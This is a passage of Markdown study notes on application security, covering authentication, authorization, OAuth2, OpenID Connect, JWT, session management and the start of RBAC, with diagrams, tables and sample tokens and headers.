# 10. Security

[<- Back to master index](../README.md)

---

## Overview

Security covers **identity** (authentication, OAuth, OIDC, JWT, sessions), **access control** (authorization, RBAC, ABAC), **data protection** (encryption at rest and in transit, KMS, secrets), **application defenses** (CSRF, XSS, SQL injection, SSRF, clickjacking), **perimeter** (DDoS, WAF), **Zero Trust**, and **audit logging**.

Sections are in order **10.1 → 10.21**.

**Topic groups:** identity (10.1–10.6) → access control (10.2, 10.7–10.8) → data protection (10.9–10.12) → app attacks & defenses (10.13–10.17) → perimeter (10.18–10.19) → Zero Trust & audit (10.20–10.21).

```text
                    +------------------+
                    |      Client      |
                    +--------+---------+
                             |
              +--------------+--------------+
              |  Identity                   |
              |  Auth · OAuth · JWT ·       |
              |  Sessions                   |
              +--------------+--------------+
                             |
              +--------------+--------------+
              |  Access control             |
              |  Authorization · RBAC · ABAC|
              +--------------+--------------+
                             |
              +--------------+--------------+
              |  Data protection            |
              |  Encrypt · KMS · Secrets    |
              +--------------+--------------+
                             |
              +--------------+--------------+
              |  App defenses               |
              |  CSRF · XSS · SQLi · SSRF   |
              +--------------+--------------+
                             |
              +--------------+--------------+
              |  Perimeter                  |
              |  DDoS · WAF                 |
              +--------------+--------------+
                             |
              +--------------+--------------+
              |  Zero Trust · Audit logging |
              +--------------+--------------+
```

---

## Sub-topics

| # | Sub-topic |
|---|-----------|
| 10.1 | Authentication |
| 10.2 | Authorization |
| 10.3 | OAuth2 |
| 10.4 | OpenID Connect |
| 10.5 | JWT |
| 10.6 | Session Management |
| 10.7 | RBAC |
| 10.8 | ABAC |
| 10.9 | Encryption at Rest |
| 10.10 | Encryption in Transit |
| 10.11 | KMS |
| 10.12 | Secret Management |
| 10.13 | CSRF |
| 10.14 | XSS |
| 10.15 | SQL Injection |
| 10.16 | SSRF |
| 10.17 | Clickjacking |
| 10.18 | DDoS Protection |
| 10.19 | WAF |
| 10.20 | Zero Trust Security |
| 10.21 | Audit Logging |

---

## 10.1 Authentication

### What is authentication?

**Authentication** is the process of verifying the identity of a user, service, or device.

**Question:** Who are you?

**Examples:**

- Username + password
- OTP
- Biometric authentication
- Social login (Google, GitHub)
- API keys
- JWT tokens

Authentication happens **before** authorization.

```text
User logs in with email/password → system verifies credentials → user is authenticated
```

### Authentication vs authorization

| | Authentication | Authorization |
|---|----------------|---------------|
| **Verifies** | Identity | Permissions |
| **Question** | Who are you? | What can you do? |

```text
User login → authentication success → authorization check → access resource
```

**Example — admin user:**

```text
Authentication: ✓ user identity verified
Authorization:  ✓ can delete users
```

### Authentication flow

```text
User
  |  login request
  v
Auth service
  |  verify credentials
  v
Database
  |  valid user?
  v
Auth service
  |  generate token
  v
User
```

### Password-based authentication

```text
1. User enters password
2. Password hashed
3. Compare with stored hash
4. Login success or failure
```

**Never store plain-text passwords.**

| Bad | Good |
|-----|------|
| `password = "welcome123"` | `password_hash = bcrypt(password)` |

**Common algorithms:** BCrypt · Argon2 · PBKDF2

**Avoid:** MD5 · SHA1

### Password hashing

Protects passwords if the database leaks.

```text
Password: welcome123
Stored:   $2a$10$abcdxyz...
```

**Registration:**

```text
Password → hash function → hash stored
```

**Login:**

```text
Entered password → hash again → compare hashes
```

### Salting

**Salt** = random value added before hashing.

**Without salt:** same password → same hash for everyone (rainbow tables work).

**With salt:** `password + randomSalt` → unique hash per user.

```text
User A: password + salt1 → hash A
User B: password + salt2 → hash B
```

**Benefits:** prevents rainbow table attacks; makes cracking harder.

### Session-based vs token-based authentication

| | Session-based | Token-based |
|---|---------------|-------------|
| **State** | Server stores session | Token sent each request |
| **Client carries** | Session ID (cookie) | Bearer token (often JWT) |
| **Trade-off** | Easy logout; harder to scale | Stateless; revocation harder |

```text
Session:  login → server creates session → cookie → server lookup on each request
Token:    login → issue token → Authorization: Bearer <token> on each request
```

JWT structure, refresh tokens, and session scaling are covered in **JWT** and **Session Management** below.

### Multi-factor authentication (MFA)

Requires multiple verification methods.

| Factor | Examples |
|--------|----------|
| Something you **know** | Password |
| Something you **have** | Phone, security key |
| Something you **are** | Fingerprint, Face ID |

**Example:** password + OTP

**Benefit:** stronger security.

### OTP authentication

**One-Time Password** flow:

```text
User login → generate OTP → send SMS/email → user enters OTP → verify OTP
```

**Best practices:**

- Expire quickly
- Single use
- Rate limit retries

### Social and delegated login

Login via third-party providers (Google, GitHub) uses **OAuth 2.0** for delegated access and **OpenID Connect** for identity — covered in the following sections.

### API key authentication

Used for service-to-service or third-party API access.

```http
GET /users
x-api-key: abc123xyz
```

| Advantages | Disadvantages |
|------------|---------------|
| Simple | Less secure |
| | Hard to manage at scale |

**Used for:** internal APIs, third-party integrations.

### Service-to-service authentication

```text
Microservice A → Microservice B
```

**Methods:** JWT · OAuth client credentials · mutual TLS (mTLS) · API keys

**Preferred:** JWT or mTLS.

### Mutual TLS (mTLS)

Both client and server verify identities.

| | Normal TLS | mTLS |
|---|------------|------|
| **Server** | Authenticated | Authenticated |
| **Client** | Not authenticated | Authenticated |

```text
Client certificate → server validation → secure communication
```

**Common in:** banking, internal microservices.

### Single sign-on (SSO)

Login once, access multiple applications.

```text
Company portal → login once → email, HR system, payroll, wiki
```

**Benefits:** better UX; centralized authentication.

### Authentication server

Dedicated service for login.

**Responsibilities:**

- User login
- Token generation
- Password reset
- MFA verification

**Benefits:** centralized security; easier maintenance.

### Security best practices

- Use HTTPS
- Hash passwords (BCrypt/Argon2)
- Use MFA
- Use short-lived access tokens
- Rotate secrets
- Encrypt sensitive data
- Rate limit login APIs
- Monitor suspicious activity
- Use refresh tokens
- Secure cookies (HttpOnly, Secure, SameSite)

### High-level authentication architecture

```text
              +----------------+
              |     Client     |
              +--------+-------+
                       |
                       v
              +----------------+
              |  API Gateway   |
              +--------+-------+
                       |
                       v
              +----------------+
              |  Auth Service  |
              +--------+-------+
                       |
             +---------+---------+
             |                   |
             v                   v
      +-------------+     +-------------+
      |  User DB    |     | Token Store |
      +-------------+     +-------------+
```

**After authentication:**

```text
Client → JWT → API Gateway → Microservices → Databases
```

### Summary

```text
Authentication = verify identity ("who are you?") — always before authorization
Passwords: hash + salt (BCrypt/Argon2); never store plaintext
Mechanisms: sessions, JWT/tokens, MFA, API keys, mTLS, SSO — OAuth/OIDC/JWT/sessions detailed below
```

---

## 10.2 Authorization

### What is authorization?

**Authorization** is the process of determining what an **authenticated** user, service, or system is allowed to do.

**Question:** What can you do?

**Examples:**

- Read a document
- Update a profile
- Delete a user
- Access an API
- View financial reports

Authorization happens **after** authentication.

```text
User login → authentication success → authorization check → access granted or denied
```

### Authentication vs authorization

| | Authentication | Authorization |
|---|----------------|---------------|
| **Verifies** | Identity | Permissions |
| **Question** | Who are you? | What can you access? |

**Example — user John:**

```text
Authentication: ✓ identity verified
Authorization:  ✓ can read reports  |  ✗ cannot delete users
```

### Authorization flow

```text
User request → authentication check → authorization check → access granted or denied
```

**Example:**

```http
DELETE /users/101
```

```text
1. User authenticated?
2. User has DELETE_USER permission?

Both true → access granted
```

### Permissions

A **permission** is an allowed action.

**Examples:** `READ_USER` · `CREATE_USER` · `UPDATE_USER` · `DELETE_USER` · `VIEW_REPORTS` · `EXPORT_DATA`

A user may have one or many permissions.

### Roles

A **role** is a collection of permissions.

```text
ADMIN
 ├── READ_USER
 ├── CREATE_USER
 ├── UPDATE_USER
 └── DELETE_USER

MANAGER
 ├── READ_USER
 └── VIEW_REPORTS

USER
 └── READ_PROFILE
```

**Benefits:** easier permission management; reduces complexity.

RBAC (role → permissions) and ABAC (attribute policies) are the two main models — each has a dedicated section below.

### Resource-based authorization

Authorization based on **ownership** of a resource.

```text
Document owner: User A
Request: DELETE document

Owner       → ✓ allowed
Other users → ✗ denied
```

**Used in:** Google Drive, Dropbox, social media posts.

### Policy-based authorization

Permissions defined using **policies** evaluated by a policy engine.

```text
Policy: allow if role = ADMIN
Policy: allow if user owns resource

Policy engine → ALLOW or DENY
```

**Benefits:** flexible; centralized management.

### Access control list (ACL)

Each resource contains a list of allowed users or groups.

```text
Document A ACL:
  User1 → read
  User2 → read, write
  User3 → read, write, delete

Request → check ACL → allow or deny
```

### Access matrix

Permissions in matrix form:

```text
                Resource
          File1   File2   File3
UserA      RW      R       -
UserB      R       RW      RW
UserC      -       R       R

R = read   W = write
```

### Authorization using JWT

Roles or permissions may be stored in JWT claims.

```json
{ "userId": 101, "role": "ADMIN" }
```

or

```json
{ "permissions": ["READ_USER", "DELETE_USER"] }
```

**Flow:**

```text
Receive JWT → validate JWT → extract role/permissions → authorize request
```

### API authorization

Protect APIs with permissions.

| Endpoint | Permission |
|----------|------------|
| `GET /users` | `READ_USER` |
| `POST /users` | `CREATE_USER` |
| `DELETE /users/{id}` | `DELETE_USER` |

```text
Request → authentication → permission check → allow or deny
```

### Microservice authorization

Each service may perform its own authorization checks.

```text
User → API gateway → order service → payment service
```

Authorization info travels via tokens or service metadata.

**Common approaches:** JWT claims · OAuth scopes · policy engines

### OAuth scopes

Scopes limit what a token may access (e.g. `read:user` allows `GET /users`, not `DELETE`). Full OAuth scope model is in **OAuth2** below.

### Centralized vs decentralized authorization

| | Centralized | Decentralized |
|---|-------------|---------------|
| **Model** | Dedicated authorization service + policy store | Each app/service owns its rules |
| **Benefits** | Consistent rules; easier governance | Simpler architecture; lower dependency |
| **Challenges** | Extra service to run | Rule duplication; inconsistent policies |

```text
Centralized:
Application → authorization service → policy store
```

### Authorization cache

Permissions are often cached for performance.

```text
User → permission lookup → cache hit → allow or deny
```

| Benefits | Challenges |
|----------|------------|
| Faster authorization | Cache invalidation |
| Reduced database load | Stale permissions after updates |

### High-level authorization architecture

```text
              +----------------+
              |     Client     |
              +--------+-------+
                       |
                       v
              +----------------+
              |  API Gateway   |
              +--------+-------+
                       |
                       v
              +----------------+
              |  Auth Service  |
              +--------+-------+
                       |
                       v
              +----------------+
              | Authorization  |
              |    Service     |
              +--------+-------+
                       |
             +---------+---------+
             |                   |
             v                   v
      +-------------+     +-------------+
      | Policy Store|     | User Store  |
      +-------------+     +-------------+

Decision: ALLOW or DENY
```

### Summary

```text
Authorization = what an authenticated principal may do ("what can you do?")
Models: RBAC, ABAC (dedicated sections), ACL, policies, resource ownership
APIs: map endpoints to permissions; JWT claims and OAuth scopes carry authorization data
```

---

## 10.3 OAuth2

### What is OAuth 2.0?

**OAuth 2.0** is an authorization framework that lets an application access resources on behalf of a user **without sharing the user's password**.

**Question:** Can this application access the user's resources?

OAuth 2.0 focuses on **authorization**, not authentication.

```text
Calendar app → needs Google Calendar access → user grants permission
(no Google password shared with the calendar app)
```

### Why OAuth 2.0?

**Without OAuth:**

```text
User → shares password → third-party application
```

**Problems:** password exposure · security risks · difficult access control · difficult revocation

**With OAuth:**

```text
User → approves access → authorization server → issues token → application uses token
```

**Benefits:** no password sharing · limited access · easy revocation · better security

### Key participants

| Role | Description | Example |
|------|-------------|---------|
| **Resource owner** | User who owns the data | John owns Google Drive files |
| **Client** | Application requesting access | Calendar app |
| **Authorization server** | Verifies user; issues tokens | Google authorization server |
| **Resource server** | Stores protected resources | Google Drive API |

### High-level flow

```text
User → client application → authorization server → user approval
     → authorization code → access token → resource server
```

### Access token

Represents granted access.

```http
Authorization: Bearer eyJhbGciOi...
```

**Characteristics:**

- Short-lived
- Contains permissions (scopes)
- Sent with every API request

### Refresh token

Used to obtain new access tokens when the access token expires.

```text
Access token expired → refresh token → new access token
```

**Benefits:** better user experience; reduced login frequency

Typically **long-lived** and stored securely.

### Scopes

Scopes define permissions granted to the client.

**Examples:** `read:user` · `write:user` · `read:orders` · `write:orders`

```text
Application requests: read:user
✓ Read user profile
✗ Update user profile
```

### Authorization code grant

Most common OAuth flow — web and mobile applications.

```text
User → client → authorization server → user login → user consent
     → authorization code → client exchanges code → access token
```

### Authorization code flow (steps)

```text
Step 1: Client redirects user → GET /oauth/authorize
Step 2: User authenticates
Step 3: User grants permission
Step 4: Authorization server returns authorization code
Step 5: Client sends code to /oauth/token
Step 6: Access token returned
```

### Why authorization code?

An intermediate **code** is returned instead of the token directly in the browser.

**Benefits:**

- More secure
- Tokens not exposed in browser URL
- Supports server-side validation

```text
Authorization code → backend exchange → access token
```

### Client credentials grant

Service-to-service communication — **no user** involved.

```text
Order service → inventory service

Service → client ID + client secret → authorization server
       → access token → API access
```

**Used in:** microservices · backend integrations · scheduled jobs

### Client credentials flow

```text
Service A → send client credentials → authorization server
        → issue access token → call protected APIs
```

### Device authorization flow

For devices with limited input — smart TVs, gaming consoles, IoT.

```text
Device displays code → user opens browser → logs in → approves device
                   → access token issued
```

### Token validation

When an API receives a token:

```text
Request → extract token → validate signature → check expiry → check scopes
       → allow or deny
```

### Token introspection

Resource server asks the authorization server about token validity.

```text
API → token → authorization server
           → valid? expired? scopes? → response
```

Useful when tokens are **opaque** (not JWT).

### Token revocation

Terminate access when needed — user logout, account compromise, permission removal.

```text
Token → revocation endpoint → invalidated → future requests denied
```

### JWT in OAuth

OAuth tokens may be opaque or **JWT**-formatted. JWT benefits for OAuth: self-contained claims, fast validation — see **JWT** section for structure and validation.

### OAuth scopes in APIs

```text
Token scope: read:orders
Allowed:     GET /orders
Denied:      DELETE /orders

Token scope: write:orders
Allowed:     POST /orders, PUT /orders
```

### Consent screen

User explicitly grants permissions.

```text
Application requests:
  ✓ Read profile
  ✓ Read contacts
  ✓ Read calendar

User approves → authorization granted
```

**Benefits:** transparency; user control

### OAuth in microservices

```text
User → API gateway → OAuth access token → microservices
```

Microservices validate: signature · expiry · scopes · claims

**Common components:** identity provider · authorization server · API gateway · resource servers

### Common OAuth endpoints

| Endpoint | Purpose |
|----------|---------|
| **Authorization** | User login and consent |
| **Token** | Issues tokens |
| **Revocation** | Invalidates tokens |
| **Introspection** | Checks token validity |

### Example complete flow

```text
User → travel app → needs Google Calendar access
     → redirect to authorization server → user login → grant permission
     → authorization code → travel app backend → token exchange
     → access token → Google Calendar API → calendar data returned
```

### Summary

```text
OAuth 2.0 = delegated authorization without sharing passwords
Key flows: authorization code (users), client credentials (services), device code (TV/IoT)
Tokens: access (short) + refresh (long); scopes limit what client can do
```

---

## 10.4 OpenID Connect

### What is OpenID Connect (OIDC)?

**OpenID Connect (OIDC)** is an identity layer built on top of **OAuth 2.0**. It provides **authentication** using OAuth 2.0 infrastructure.

**Question:** Who is the user?

| | OAuth 2.0 | OIDC |
|---|-----------|------|
| **Focus** | Authorization | Authentication |
| **Question** | What can be accessed? | Who is the user? |

### Why OIDC?

**OAuth 2.0** tells applications: what can this application access?

**OIDC** tells applications: who is the user?

**Example — Login with Google:**

Application needs:

- User identity
- User profile
- User email

OIDC provides this information.

### OAuth vs OIDC

| | OAuth 2.0 | OIDC |
|---|-----------|------|
| **Purpose** | Authorization | Authentication |
| **Question** | What can be accessed? | Who is the user? |
| **Returns** | Access token | ID token + access token |

### Common example

User clicks **Login with Google**:

```text
User → Google login → authentication → ID token returned → application identifies user
```

**Without OIDC:** application receives access permission only.

**With OIDC:** application receives user identity.

### Key participants

| Role | Description |
|------|-------------|
| **End user** | Actual user |
| **Client** | Application requesting login |
| **Identity provider (IdP)** | Authenticates users — Google, Microsoft, Okta, Keycloak |
| **Resource server** | Provides protected APIs |

### Identity provider (IdP)

Central authentication system.

**Responsibilities:**

- User login
- Password verification
- MFA verification
- ID token generation
- User information management

```text
User → Google → identity verified → ID token issued
```

### High-level OIDC flow

```text
User → application → identity provider → user login → authorization code
     → ID token + access token → application
```

### ID token

Most important OIDC concept — information about the authenticated user.

Usually implemented as **JWT**:

```text
Header.Payload.Signature
```

### ID token content

**Example payload:**

```json
{
  "sub": "12345",
  "name": "John Doe",
  "email": "john@example.com",
  "iss": "https://idp.com",
  "aud": "client-app",
  "exp": 123456789
}
```

| Claim | Meaning |
|-------|---------|
| `sub` | Unique user identifier |
| `name` | User name |
| `email` | User email |
| `iss` | Issuer |
| `aud` | Audience |
| `exp` | Expiration time |

### Access token in OIDC

OIDC still uses OAuth **access tokens** for API access.

```http
Authorization: Bearer access_token
```

| Token | Purpose |
|-------|---------|
| **ID token** | Identity — who is the user |
| **Access token** | API access — what APIs can be called |

### Authorization code flow with OIDC

Most common OIDC flow.

```text
User → application → identity provider → authentication → authorization code
     → backend exchange → ID token + access token
```

### OIDC scopes

OIDC introduces identity scopes.

| Scope | Purpose |
|-------|---------|
| `openid` | **Required** — enables OIDC |
| `profile` | Basic user information |
| `email` | User email |
| `address` | Address information |
| `phone` | Phone number |

**Example:**

```text
scope=openid profile email
```

### OpenID scope

```text
scope=openid  →  application requests authentication (OIDC flow)

Without openid → OAuth flow only
With openid    → OIDC flow
```

### UserInfo endpoint

Provides additional user details beyond the ID token.

```text
Application → access token → UserInfo endpoint → user profile data
```

**Example response:**

```json
{
  "name": "John",
  "email": "john@example.com"
}
```

### Discovery endpoint

Clients automatically discover OIDC configuration.

**Contains:** authorization endpoint · token endpoint · UserInfo endpoint · JWKS endpoint · supported scopes

**Benefits:** simplifies integration; standardized configuration

### JWKS endpoint

**JSON Web Key Set** — public keys to verify ID token signatures.

```text
Receive ID token → fetch public key → verify signature → trust user identity
```

### Token validation

Before trusting an ID token, check:

- Signature
- Issuer (`iss`)
- Audience (`aud`)
- Expiration (`exp`)
- Subject (`sub`)

```text
ID token → validate claims → user authenticated
```

### Single sign-on (SSO)

OIDC is commonly used for SSO.

```text
Employee login → identity provider → access email, HR portal, payroll, wiki, internal tools
```

User logs in **once**.

### Social login

OIDC powers modern social logins — Google, Microsoft, Apple.

```text
Application → identity provider → authenticate user → ID token → user logged in
```

### OIDC in microservices

```text
User → frontend → identity provider → ID token + access token
     → API gateway → microservices
```

| Component | Typical token |
|-----------|---------------|
| **Microservices** | Access token |
| **Frontend** | ID token |

### OAuth 2.0 flow vs OIDC flow

**OAuth 2.0:**

```text
User → authorization → access token → API access
```

**OIDC:**

```text
User → authentication → ID token + access token → application knows user identity
```

### OIDC architecture

```text
             +------------------+
             |      User        |
             +--------+---------+
                      |
                      v
             +------------------+
             |   Client App     |
             +--------+---------+
                      |
                      v
             +------------------+
             | Identity Provider|
             +--------+---------+
                      |
          +-----------+-----------+
          |                       |
          v                       v
    +-----------+          +-----------+
    | ID Token  |          |AccessToken|
    +-----------+          +-----------+
          |                       |
          v                       v
    User Identity         Protected APIs
```

### Summary

```text
OIDC = authentication layer on OAuth 2.0 ("who is the user?")
ID token (JWT) = identity; access token = API access
Key pieces: openid scope, UserInfo, discovery, JWKS, SSO/social login
```

---

## 10.5 JWT

### What is JWT?

**JWT (JSON Web Token)** is a compact, self-contained token used to securely transfer information between parties. The information can be **verified** because it is digitally signed.

**Common uses:**

- Authentication
- Authorization
- Single sign-on (SSO)
- Service-to-service communication

JWT is commonly used in **stateless** systems.

### Why JWT?

**Traditional session approach:**

```text
Client → session ID → server → session store
```

Server must maintain session state.

**JWT approach:**

```text
Client → JWT → server
```

Server validates the token — **no session storage** required.

**Benefits:** stateless · scalable · easy for distributed systems · suitable for APIs and microservices

### JWT structure

A JWT has three parts:

```text
Header.Payload.Signature

Example: xxxxx.yyyyy.zzzzz
```

Encoded using **Base64URL**.

### Header

Metadata about the token.

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

| Field | Meaning |
|-------|---------|
| `alg` | Signing algorithm |
| `typ` | Token type |

### Payload

Contains **claims** (data).

```json
{
  "sub": "101",
  "name": "John",
  "role": "ADMIN"
}
```

Payload is **encoded, not encrypted** by default. Anyone with the token can decode and read it.

**Do not store sensitive information** in JWT payloads.

### Signature

Verifies token integrity.

```text
HMACSHA256(Header + Payload + SecretKey)
```

If the payload changes → signature changes → token becomes **invalid**.

### Visual structure

```text
Header { "alg":"HS256" }
     +
Payload { "userId":101 }
     +
Secret key
     ↓
Signature
     ↓
JWT = Header.Payload.Signature
```

### Claims

Pieces of information in the payload — user ID, role, permissions, issuer, expiration.

**Categories:**

- Registered claims
- Public claims
- Private claims

### Registered claims

Standard JWT claims.

| Claim | Meaning |
|-------|---------|
| `sub` | Subject |
| `iss` | Issuer |
| `aud` | Audience |
| `exp` | Expiration time |
| `iat` | Issued at |
| `nbf` | Not before |
| `jti` | JWT identifier |

```json
{
  "sub": "123",
  "iss": "auth-service",
  "exp": 1711111111
}
```

### Public claims

Custom claims with agreed naming across systems.

```json
{
  "department": "Finance",
  "location": "India"
}
```

### Private claims

Application-specific claims.

```json
{
  "userId": 101,
  "role": "ADMIN"
}
```

Meaningful only within a particular application ecosystem.

### JWT generation flow

```text
User login → validate credentials → create claims → generate signature → return JWT
```

### JWT authentication flow

```text
User login → auth service → generate JWT → client stores JWT
     → client sends JWT → server validates JWT → access granted
```

### JWT in API requests

Sent in HTTP headers:

```http
Authorization: Bearer eyJhbGciOi...
```

```text
Client → bearer token → API → validate token → process request
```

### JWT validation

Before trusting a JWT, validate:

- Signature
- Expiration
- Issuer
- Audience
- Token format

```text
Receive token → verify signature → validate claims → allow access
```

### Token expiration

JWTs usually include expiration:

```json
{ "exp": 1750000000 }
```

**Purpose:** reduce attack window; improve security

**Common practice:** access tokens are **short-lived**.

### Access token

Used to access protected resources.

```http
Authorization: Bearer access_token
```

**Contains:** user ID · roles · permissions · scopes

**Characteristics:** short lifespan · frequently validated

### Refresh token

Used to obtain new access tokens.

```text
Access token expires → refresh token → authorization server → new access token
```

**Benefits:** fewer logins; better user experience

### Signing algorithms

| Algorithm | Type |
|-----------|------|
| **HS256** | HMAC SHA-256 |
| **HS512** | HMAC SHA-512 |
| **RS256** | RSA SHA-256 |
| **ES256** | ECDSA SHA-256 |

### Symmetric signing (HS256)

Same secret key for signing and verification.

```text
Secret key → sign JWT → verify JWT
```

| Advantages | Challenges |
|------------|------------|
| Fast, simple | Secret must be shared with all verifiers |

### Asymmetric signing (RS256)

| Key | Use |
|-----|-----|
| **Private key** | Sign JWT |
| **Public key** | Verify JWT |

```text
Private key → sign JWT → public key → verify JWT
```

**Benefits:** better key management; suitable for distributed systems

### JWT in microservices

```text
User → API gateway → JWT → order service → payment service → inventory service
```

Each service can **independently verify** the token.

**Benefits:** no centralized session store; better scalability

### JWT revocation challenge

JWT is stateless. Once issued, the server typically **cannot immediately invalidate** it everywhere.

**Possible approaches:**

- Short expiration times
- Token blacklist
- Token versioning
- Refresh token rotation

### JWT storage options

| Location | Options |
|----------|---------|
| **Browser** | Local storage, session storage |
| **Cookie** | HttpOnly cookie, secure cookie |
| **Server** | Less common for JWT |

Choice depends on security and application architecture.

### Security considerations

- Use HTTPS
- Validate signatures
- Use expiration times
- Avoid sensitive payload data
- Rotate signing keys
- Validate issuer and audience
- Use secure storage mechanisms
- Implement refresh token rotation

### High-level JWT architecture

```text
             +----------------+
             |     Client     |
             +--------+-------+
                      | Login
                      v
             +----------------+
             |  Auth Service  |
             +--------+-------+
                      | JWT
                      v
             +----------------+
             |     Client     |
             +--------+-------+
                      | Bearer Token
                      v
             +----------------+
             |  API Gateway   |
             +--------+-------+
                      |
          +-----------+-----------+
          |                       |
          v                       v
   +-------------+        +-------------+
   | Order Svc   |        | Payment Svc |
   +-------------+        +-------------+

Each service validates JWT independently.
```

### Summary

```text
JWT = Header.Payload.Signature — signed, self-contained, stateless
Claims: registered (sub, iss, exp), public, private
HS256 = shared secret | RS256 = public/private key pair
Pair short access tokens with refresh tokens; validate signature + exp + iss + aud
```

---

## 10.6 Session Management

### What is session management?

**Session management** is the process of maintaining user state across multiple requests after successful authentication.

HTTP is **stateless** — every request is independent. Session management helps the server **remember the user** between requests.

```text
User login → session created → user browses website → server recognizes user
```

### Why session management?

**Without sessions:**

```text
Request 1: login
Request 2: server does not know who the user is
Request 3: authentication required again
```

**With sessions:**

```text
Login once → session created → session ID sent → subsequent requests recognized
```

**Benefits:** better user experience · persistent login state · user tracking during interaction

### Session

A session represents a user's interaction with an application during a specific time period.

```text
User: John

Session (stored on server):
{
  userId: 101,
  loginTime: "10:00 AM"
}

Associated with a unique session ID.
```

### Session ID

Unique identifier for a session.

```text
sessionId = A8D9K3M2X7Y1
```

**Characteristics:** random · unique · difficult to guess

Client stores the session ID and sends it with every request.

### Session creation flow

```text
User login → validate credentials → create session → generate session ID
     → store session → return session ID
```

### Session storage

```text
Session ID → session data

{
  userId: 101,
  role: "ADMIN",
  loginTime: "10:00"
}
```

### Session-based authentication flow

```text
User login → server creates session → store session data → return session ID
     → browser stores cookie → future requests → server finds session → access granted
```

### Session cookie

Most common way to carry the session ID.

```http
Set-Cookie: SESSION_ID=abc123
```

Browser automatically sends the cookie with future requests:

```http
Cookie: SESSION_ID=abc123
```

### Session lookup

```text
Incoming request → read session ID → find session → load user data → process request

SESSION_ID=abc123 → User = John, Role = ADMIN
```

### Session lifecycle

```text
Login → session creation → active session → session expiration → session removal
```

A session exists only for a **limited time**.

### Session timeout

Sessions usually expire after inactivity.

```text
30 minutes inactive → session expired
```

**Benefits:** improved security · automatic cleanup

### Absolute expiration

Session expires after a **fixed duration** regardless of activity.

```text
Login: 10:00 AM
Expiration: 06:00 PM
```

Even if active, session ends at 06:00 PM.

### Idle timeout

Session expires if the user remains **inactive**.

```text
Last activity: 10:00 AM
Timeout: 30 minutes
No activity until 10:30 AM → session expires
```

### Logout flow

```text
User clicks logout → delete session → invalidate session ID
     → remove cookie → access denied
```

### Stateful nature of sessions

Session-based systems are **stateful** — the server maintains user state.

```text
Server memory: Session A, Session B, Session C
```

Every active session consumes resources.

### Scaling challenge

**Single server:** all sessions on one machine.

**Multiple servers:**

```text
Request 1 → Server A (has session)
Request 2 → Server B (may not have session)
```

### Sticky sessions

Load balancer always routes a user to the **same server**.

```text
User A → all requests → Server A
```

| Benefits | Challenges |
|----------|------------|
| Simple implementation | Poor scalability |
| | Server dependency |

### Centralized session store

Store sessions in **shared storage** (e.g. Redis).

```text
               +---------+
               |  Redis  |
               +---------+
              /           \
       +----------+   +----------+
       | Server A |   | Server B |
       +----------+   +----------+
```

Both servers access the same sessions.

**Benefits:** better scalability · high availability

### Redis for session storage

Popular choice — in-memory, fast lookup, expiration support.

```text
Key:   session:abc123
Value: { userId: 101, role: "ADMIN" }
```

### Session replication

Session data replicated between servers.

```text
Server A → replicate session → Server B
```

| Benefits | Challenges |
|----------|------------|
| Improved fault tolerance | Synchronization overhead |
| | Increased complexity |

### Session fixation

Attack: attacker forces a known session ID **before** login.

```text
Attacker provides session ID → victim logs in → same session continues
```

**Protection:** generate a **new session ID after login**.

### Session hijacking

Attacker steals a valid session ID and impersonates the user.

**Common causes:** insecure network · XSS attacks · cookie theft

**Protection:** HTTPS · secure cookies · HttpOnly cookies

### Secure cookies

Cookie transmitted only over HTTPS.

```http
Set-Cookie: ...; Secure
```

Prevents transmission over plain HTTP.

### HttpOnly cookies

JavaScript cannot access the cookie.

```http
Set-Cookie: ...; HttpOnly
```

Protects against many XSS-based cookie theft attacks.

### SameSite cookies

Controls cross-site cookie behavior.

**Values:** `Strict` · `Lax` · `None`

```http
Set-Cookie: ...; SameSite=Strict
```

Helps prevent CSRF attacks.

### Session management in microservices

```text
Client → API gateway → session validation → shared session store → microservices
```

Session validation is often handled centrally by the API gateway or auth service.

### Session architecture

```text
              +----------------+
              |     Client     |
              +--------+-------+
                       | Cookie
                       v
              +----------------+
              | Load Balancer  |
              +--------+-------+
                       |
            +----------+----------+
            |                     |
            v                     v
      +-------------+      +-------------+
      |  Server A   |      |  Server B   |
      +------+------+      +------+------+
             \                    /
              \                  /
               v                v
               +----------------+
               | Session Store  |
               |     Redis      |
               +----------------+
```

### Summary

```text
Session management = server-side state across HTTP requests (session ID in cookie)
Scale with Redis central store; avoid sticky sessions when possible
Secure: new ID on login, HTTPS, HttpOnly, Secure, SameSite; idle + absolute timeout
```

---

## 10.7 RBAC

### What is RBAC?

**Role-based access control (RBAC)** assigns users to **roles**; each role holds a set of **permissions**. Access decisions check whether the user's role includes the required permission.

```text
User → Role → Permissions → allow or deny
```

**Question answered:** What can this role do?

### Why RBAC?

| Benefit | Description |
|---------|-------------|
| Easier permission management | Grant/revoke roles instead of individual permissions per user |
| Reduced complexity | Group related permissions under named roles |
| Consistent access | Same role = same permissions across users |

### Permissions

A **permission** is an allowed action.

**Examples:** `READ_USER` · `CREATE_USER` · `UPDATE_USER` · `DELETE_USER` · `VIEW_REPORTS` · `EXPORT_DATA`

A user may have one or many permissions (via one or more roles).

### Roles

A **role** is a collection of permissions.

```text
ADMIN
 ├── READ_USER
 ├── CREATE_USER
 ├── UPDATE_USER
 └── DELETE_USER

MANAGER
 ├── READ_USER
 └── VIEW_REPORTS

USER
 └── READ_PROFILE
```

### RBAC model

Users receive roles; roles contain permissions.

```text
User: John
Role: ADMIN
Permissions: create user, delete user, update user
```

### RBAC request flow

```text
Request → check role → check permission → allow or deny
```

**Example:**

```http
DELETE /users/101
```

```text
1. User authenticated?
2. User has role with DELETE_USER permission?

Both true → access granted
```

### RBAC database design

```text
Users          Roles           Permissions
-----          -----           -----------
id             id              id
name           role_name       permission_name

User_Roles          Role_Permissions
----------          ----------------
user_id             role_id
role_id             permission_id

User → Role → Permission
```

### Fine-grained vs coarse-grained RBAC

| | Fine-grained | Coarse-grained |
|---|--------------|----------------|
| **Level** | Per action on resource | Broad area |
| **Example** | Can view customer ✓ · edit ✗ · delete ✗ | Admin area: ADMIN ✓ · USER ✗ |
| **Benefits** | Better control and security | Simpler; faster checks |
| **Common in** | Enterprise, banking | Simple apps |

### API authorization with RBAC

Protect APIs using role permissions.

| Endpoint | Permission |
|----------|------------|
| `GET /users` | `READ_USER` |
| `POST /users` | `CREATE_USER` |
| `DELETE /users/{id}` | `DELETE_USER` |

```text
Request → authentication → permission check → allow or deny
```

### RBAC using JWT

Roles or permissions may be stored in JWT claims.

```json
{ "userId": 101, "role": "ADMIN" }
```

or

```json
{ "permissions": ["READ_USER", "DELETE_USER"] }
```

```text
